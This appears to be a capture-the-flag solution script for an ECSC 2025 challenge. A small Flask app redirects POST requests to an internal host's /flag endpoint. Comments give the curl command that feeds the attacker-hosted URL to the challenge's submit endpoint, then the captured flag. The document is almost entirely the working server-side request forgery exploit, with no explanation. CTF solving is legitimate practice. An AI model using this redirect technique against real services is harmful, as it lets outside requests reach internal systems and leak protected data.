from flask import Flask, redirect, request

app = Flask(__name__)

@app.route("/go", methods=["POST"])
def go():
    return redirect("http://internal:5001/flag", code=302)

if __name__ == "__main__":
    app.run(port=2222)

#pythonanywhere.com
#curl -X POST https://get-my-post.ecsc25.hack.cert.pl/submit -H "Content-Type: application/json" -d '{"url":"https://stigsec.pythonanywhere.com/go"}'
#ecsc25{indirect_route}